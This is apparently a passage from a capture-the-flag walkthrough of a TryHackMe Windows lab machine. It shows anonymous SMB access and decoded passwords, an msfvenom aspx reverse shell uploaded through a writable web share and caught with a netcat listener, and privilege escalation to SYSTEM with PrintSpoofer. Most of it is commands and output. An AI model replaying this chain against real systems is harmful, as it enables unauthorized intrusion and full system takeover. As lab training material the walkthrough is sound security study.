Connecting to smbclient //10.114.175.236/nt4wrksv -N
I get password.txt in base64 format. After decoding it:
```
Bob - !P@$$W0rD!123
```
```
Bill - Juw4nnaM4n4220696969!$$$
```

I tried using them to get access using **rdp** but failed. I then looked into the vulnerability that I had found earlier while reconnaissance.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*O7IT0BSfpA0QSRwfl0Jiiw.png)

The vulnerability lead to remote code execution. So to exploit it, I created an **aspx** payload using **msfvenom**.
![](https://miro.medium.com/v2/resize:fit:700/1*4ku9X6fyZg7pvMHLKGcIEg.png)

I then uploaded the payload on the **smb** server.

## Getting a shell

Now that we have our shell uploaded and in place I start a listener on my system and then navigate to the shell with my web browser. And we’re in!

```
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [MY IP] from (UNKNOWN) [10.10.33.153] 49914
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

Running `whoami`:

```
iis apppool\defaultapppool
```

And a `whoami /priv`:

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

Running a `dir \users` shows us:

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\users

07/25/2020  01:03 PM    <DIR>          .
07/25/2020  01:03 PM    <DIR>          ..
07/25/2020  07:05 AM    <DIR>          .NET v4.5
07/25/2020  07:05 AM    <DIR>          .NET v4.5 Classic
07/25/2020  09:30 AM    <DIR>          Administrator
07/25/2020  01:03 PM    <DIR>          Bob
07/25/2020  06:58 AM    <DIR>          Public
               0 File(s)              0 bytes
               7 Dir(s)  21,052,170,240 bytes free
```

And a `dir \users\Bob\Desktop`:

```
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\users\Bob\Desktop

07/25/2020  01:04 PM    <DIR>          .
07/25/2020  01:04 PM    <DIR>          ..
07/25/2020  07:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,052,190,720 bytes free
```

Let’s get that user flag. Running: `type \users\Bob\Desktop\user.txt`:

```
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```

We get an access denied message when trying to access the **Administrator** folder.

## Privilege Escalation

According to the `whoami /priv` I ran earlier we have **SeImpersonatePrivilege** and I know there are some escalation methods around that. I decide to google search it and do some reasearch:

  

![](https://j-info.github.io/ctfsite/walkthroughs/images/relevant3.png)

  

Opening the link displayed there covers many methods for escalating privileges and the one I was able to get working was the one in the title of the link, **PrintSpoofer**.

There are both 32 and 64 bit versions for download here, and we’ll need the 64 bit one:

[https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0](https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0)

You can check your architecture in Windows with the following command if you don’t have GUI access:

`wmic os get osarchitecture`

```
c:\windows\system32\inetsrv>wmic os get osarchitecture
wmic os get osarchitecture
OSArchitecture  
64-bit
```

I then upload the **PrintSpoofer64.exe** file to the SMB share so we can retrieve it on the target system and run it in our shell.

```
smb: \> put PrintSpoofer64.exe
putting file PrintSpoofer64.exe as \PrintSpoofer64.exe (83.9 kb/s) (average 53.8 kb/s)
smb: \> dir
  .                                   D        0  Mon Feb  7 01:14:24 2022
  ..                                  D        0  Mon Feb  7 01:14:24 2022
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020
  PrintSpoofer64.exe                  A    27136  Mon Feb  7 01:14:24 2022
  shell.aspx                          A     3406  Mon Feb  7 01:10:55 2022

                7735807 blocks of size 4096. 4949954 blocks available
```

You can find the files locoated in the **inetpub\wwwroot\nt4wrksv** directory:

```
c:\inetpub\wwwroot\nt4wrksv>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of c:\inetpub\wwwroot\nt4wrksv

02/06/2022  10:14 PM    <DIR>          .
02/06/2022  10:14 PM    <DIR>          ..
07/25/2020  07:15 AM                98 passwords.txt
02/06/2022  10:14 PM            27,136 PrintSpoofer64.exe
02/06/2022  10:10 PM             3,406 shell.aspx
               3 File(s)         30,640 bytes
               2 Dir(s)  20,275,011,584 bytes free
```

I found instructions for running the **PrintSpoofer64** command here:

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

Running the command they specified did not work however.

`PrintSpoofer64.exe -i -c powershell`

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c powershell
PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[-] Operation failed or timed out.

c:\inetpub\wwwroot\nt4wrksv>whoami
whoami
iis apppool\defaultapppool
```

I was able to get this working by using **cmd** instead of **powershell**:

`PrintSpoofer64.exe -i -c cmd`

```
c:\inetpub\wwwroot\nt4wrksv>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

  

## Finishing things up

I take a look on the administrators desktop and the final flag is sitting there:

`dir \users\administrator\desktop`

```
C:\Windows\system32>dir \users\administrator\desktop
dir \users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\users\administrator\desktop

07/25/2020  07:24 AM    <DIR>          .
07/25/2020  07:24 AM    <DIR>          ..
07/25/2020  07:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,217,847,808 bytes free
```

And to display the flag:

`type \users\administrator\desktop\root.txt`

